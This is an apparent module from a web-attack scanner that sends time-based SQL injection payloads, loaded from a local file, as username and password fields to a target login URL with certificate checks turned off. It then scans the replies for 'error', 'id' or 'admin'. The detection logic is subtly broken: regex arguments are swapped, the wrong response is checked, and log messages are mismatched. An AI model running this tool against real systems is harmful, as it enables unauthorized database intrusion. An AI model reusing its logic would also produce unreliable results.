import os
import asyncio
import re
import requests
from colorama import Fore,init
from datetime import datetime
# from database import create_database_for_Captures
import sqlite3
import logging
import sys
parent_dir = os.path.dirname(os.path.abspath(__file__))
sys.path.append(parent_dir)
import sys
import os
import logging

current_directory = os.getcwd()

sys.path.append(current_directory)


attack_type = "authentication bypass SQL injection"
from lib.scripts.headers import Prepare_the_headers
from lib.scripts.headers import headers
from lib.scripts.headers import header
from  lib.regelexpression.patterns import Detect
from lib.priority.Priority import PRIORITY
from lib.priority.Priority import HARMFULL
from logger.logs import logger
from Exceptions.exceptions import SQLJNGInstallationError
from lib.Cookies.cookies import extract_cookies


####################################################
attack_type = "Time based SQL injection"

#######################################
pattern = r"\berror\b"
htmlpattern = r"\bid\b"
time_based_injection_capture = []
########################################
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
}

##########################################

""" 
              Reference : https://github.com/payloadbox/sql-injection-payload-list 
              for The payloads"""


__priority = PRIORITY.HIGH
__harmfull = HARMFULL.MEDIUM


async def Time_based_sql_injection_HEADER(urls):
    """This injection if when the attacker can manipulate the timing of SQL queries and extract the data out of database. """
    try:
        extract_cookies(host=urls)
        global pattern,htmlpattern
        done = False
        filename = "Time_based_sql.txt"
        current_directory = os.path.dirname(os.path.abspath(__file__))
        file_path = os.path.join(current_directory, filename)

        with open(file_path, "r") as file:
            payload = file.read()
            rows = payload.split("\n")
            sorted_rows = sorted(rows)
            sorted_payload = "\n".join(sorted_rows)
            print(f"[{datetime.now()}]",Fore.RED + str(sorted_payload))
            requests.packages.urllib3.disable_warnings()  
            # url = "https://redtiger.labs.overthewire.org/level1.php"
            req = requests.get(url=urls,verify=False)
            if req.status_code == 200:
                ask = input(f"[{datetime.now()}]"+Fore.GREEN + f"Looks like the host is up with the url:{urls} \n Do you want to send the payload to the website? ")
                logger.info("Payload above is ready to be sent.")

                if ask.lower() == "y":
                    for line in sorted_payload.split("\n"):
                        params = {
                            "username": line,
                            "password": line
                        }
                        ack = requests.post(url=urls, data=params,verify=False)
                        logger.info(f"Sending payload to the target:{urls}")
                        await asyncio.sleep(5)
                        if "error" in ack.text:
                            logger.info("Error parameter may exists in the target.")
                            Detect(ack.text)
                            await asyncio.sleep(3)
                            
                        vuln = re.findall(ack.text,pattern,flags=re.IGNORECASE)
                        htmlVULN = re.findall(ack.text,htmlpattern,flags=re.IGNORECASE)
                        if vuln:
                            logger.info("id parameter may exists in the target.")
                            Detect(ack.text)
                            await asyncio.sleep(3)
                        
                        if htmlVULN:
                            logger.info("Error parameter may exists in the target.")
                            Detect(ack.text)
                            await asyncio.sleep(3)
                        
                        word = "id" in req.text
                        errword = "error" in req.text
                        if word:
                            logger.info("Id parameter may exists in the target.")
                            Detect(ack.text)
                            await asyncio.sleep(3)
                        
                        if errword:
                            logger.info("Error parameter may exists in the target.")
                            Detect(ack.text)
                            await asyncio.sleep(3)
                            
                        
                            
                    if req.status_code == 302:
                        logger.info("Could inject the code into the target:",urls)
                        done = True
                        
                    if "Admin" in vuln or "admin" in vuln or "Admin" in ack.text or "admin" in ack.text or "Admin" in htmlVULN or "admin" in htmlVULN:
                        logger.info("Admin paramter may exists.")
                        Detect(ack.text)
                        
                else:
                    pass
                
            else:
                logger.info("Host is down.")
                
     
    except Exception as e:
        logger.error(str(e))
    
    finally:
        logger.info("Injection done.")

        

# extract_cookies("https://example.com")
# asyncio.run(Time_based_sql_injection_HEADER("https://example.com"))